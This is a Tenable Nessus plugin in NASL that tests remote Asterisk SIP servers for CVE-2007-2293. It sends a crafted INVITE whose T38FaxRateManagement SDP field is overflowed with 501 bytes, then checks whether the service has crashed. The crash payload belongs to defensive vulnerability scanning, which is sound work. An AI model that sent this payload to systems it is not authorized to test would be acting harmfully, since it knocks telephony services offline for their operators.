#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25671);
  script_version("$Revision: 1.23 $");
  script_cvs_date("$Date: 2016/10/07 13:30:46 $");

  script_cve_id("CVE-2007-2293");
  script_bugtraq_id(23648);
  script_osvdb_id(35368);

  script_name(english:"Asterisk SIP Channel T.38 SDP Parsing Multiple Buffer Overflows");
  script_summary(english:"Sends a special packet to Asterisk's SIP/SDP handler");

  script_set_attribute(attribute:"synopsis", value:
"A telephony application running on the remote host is affected by
multiple buffer overflow vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The version of Asterisk running on the remote host contains two
stack-based buffer overflows in its SIP SDP handler when attempting to
read the 'T38FaxRateManagement:' and 'T38FaxUdpEC:' options in the SDP
within a SIP packet.  An unauthenticated, remote attacker may be able
to leverage this flaw to execute code on the affected host subject to
the privileges under which Asterisk runs.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/472804/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://downloads.asterisk.org/pub/security/ASA-2007-010.html");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2007/Apr/652");
  script_set_attribute(attribute:"solution", value:
"Either disable T.38 support or upgrade to Asterisk 1.4.3 / AsteriskNow
Beta 6 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/04/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/07/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2007/04/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:digium:asterisk");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("asterisk_detection.nasl");
  script_require_ports("Services/udp/sip", "Services/sip");
  script_require_keys("asterisk/sip_detected", "Settings/ParanoidReport");


  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

get_kb_item_or_exit("asterisk/sip_detected");

asterisk_kbs = get_kb_list("sip/asterisk/*/version");
if (isnull(asterisk_kbs)) exit(1, "Could not obtain any version information from listening Asterisk SIP server(s).");

is_vuln = FALSE;
not_vuln_installs = make_list();
errors = make_list();

foreach kb_name (keys(asterisk_kbs))
{
  item = eregmatch(pattern:"/(udp|tcp)/([0-9]+)/version", string:kb_name);
  if (isnull(item))
  {
    errors = make_list(errors, "Unexpected error parsing port number from kb name: "+kb_name);
    continue;
  }

  proto = item[1];
  port  = item[2];
  version = asterisk_kbs[kb_name];

  if (version == 'unknown')
    errors = make_list(errors, "Unable to obtain version of install on " + proto + "/" + port);

  if (proto == 'udp')
  {
    if (!get_udp_port_state(port))
    {
      errors = make_list(errors, proto + " port " + port + " is not open");
      continue;
    }

    if (islocalhost())
      soc = open_sock_udp(port);
    else soc = open_priv_sock_udp(sport:5060, dport:port);
  }
  else
  {
    if (!get_tcp_port_state(port))
    {
      errors = make_list(errors, proto + " port " + port + " is not open");
      continue;
    }
    soc = open_sock_tcp(port);
  }

  if (!soc)
  {
    errors = make_list(errors, "Failed to open a " + proto + " socket on port " + port);
    continue;
  }

  via_protocol = proto;

  encaps = get_port_transport(port);
  if (!isnull(encaps) && proto == 'tcp')
  {
    if (encaps && encaps > ENCAPS_IP)
      via_protocol = 'tls';
  }

  probe =
  "OPTIONS sip:" + get_host_name() + " SIP/2.0" + '\r\n' +
  "Via: SIP/2.0/" + toupper(via_protocol) + " " + this_host() + ":" + port + '\r\n' +
  'Max-Forwards: 70\r\n' +
  "To: <sip:" + this_host() + ":" + port + '>\r\n' +
  "From: Nessus <sip:" + this_host() + ":" + port + '>;tag=' + rand() + '\r\n' +
  "Call-ID: " + rand() + '\r\n' +
  'CSeq: 63104 OPTIONS\r\n' +
  "Contact: <sip:" + this_host() + '>\r\n' +
  'Accept: application/sdp\r\n' +
  'Content-Length: 0\r\n' +
  '\r\n';

  send(socket:soc, data:probe);
  res = recv(socket:soc, length:1024);

  if (!strlen(res) || isnull(res))
  {
    close(soc);
    errors = make_list(errors, "Received no response or a zero-length response to OPTIONS request on "+proto+" port "+port);
    continue;
  }

  # Try to crash the service.
  sploit =
  "INVITE sip:200@" + get_host_name() + " SIP/2.0" + '\r\n' +
  'Date: Wed, 21 Mar 2007 4:20:09 GMT\r\n' +
  'CSeq: 1 INVITE\r\n' +
  "Via: SIP/2.0/" + toupper(via_protocol) + " " + this_host() + ":" + port + ';branch=z9hG4bKfe06f452-2dd6-db11-6d02-000b7d0dc672;rport\r\n' +
  'User-Agent: NGS/2.0\r\n' +
  'From: "' + SCRIPT_NAME + '" <sip:nessus@' + this_host() + ":" + port + '>;tag=de92d852-2dd6-db11-9d02-000b7d0dc672\r\n' +
  'Call-ID: f897d952-2fa6-db49441-9d02-001b7d0dc672@nessus\r\n' +
  "To: <sip:200@" + get_host_name() + ":" + port + '>\r\n' +
  "Contact: <sip:nessus@" + this_host() + ":" + port + ';transport=udp>\r\n' +
  'Allow: INVITE,ACK,OPTIONS,BYE,CANCEL,NOTIFY,REFER,MESSAGE\r\n' +
  'Content-Type: application/sdp\r\n' +
  'Content-Length: 796\r\n' +
  'Max-Forwards: 70\r\n' +
  '\r\n' +
  'v=0\r\n' +
  "o=rtp 1160124458839569000 160124458839569000 IN IP4 " + this_host() + '\r\n' +
  's=-\r\n' +
  "c=IN IP4 " + get_host_ip() + '\r\n' +
  't=0 0\r\n' +
  'm=image 5004 UDPTL t38\r\n' +
  'a=T38FaxVersion:0\r\n' +
  'a=T38MaxBitRate:14400\r\n' +
  'a=T38FaxMaxBuffer:1024\r\n' +
  'a=T38FaxMaxDatagram:238\r\n' +
  "a=T38FaxRateManagement:" + crap(data:"A", length:501) + '\r\n' +
  'a=T38FaxUdpEC:t38UDPRedundancy\r\n';

  send(socket:soc, data:sploit);
  res = recv(socket:soc, length:1024);

  if (!strlen(res) || isnull(res))
  {
    # There's a problem if the service is down now.

    # nb: if asterisk was started via safe_asterisk, this check will fail
    #     since safe_asterisk will just respawn asterisk.
    send(socket:soc, data:probe);
    res = recv(socket:soc, length:1024);

    close(soc);
    if (!strlen(res) || isnull(res))
    {
      security_hole(port:port, proto:proto);
      is_vuln = TRUE;
    }
  }
  else not_vuln_installs = make_list(not_vuln_installs, version + " on port " + proto + "/" + port);
  close(soc);
}

if (max_index(errors))
{
  if (max_index(errors) == 1) errmsg = errors[0];
  else errmsg = 'Errors were encountered verifying installs : \n  ' + join(errors, sep:'\n  ');

  exit(1, errmsg);
}
else
{
  installs = max_index(not_vuln_installs);
  if (installs == 0)
  {
    if (is_vuln)
      exit(0);
    else
      audit(AUDIT_NOT_INST, "Asterisk");
  }
  else if (installs == 1) audit(AUDIT_INST_VER_NOT_VULN, "Asterisk " + not_vuln_installs[0]);
  else exit(0, "The Asterisk installs (" + join(not_vuln_installs, sep:", ") + ") are not affected.");
}
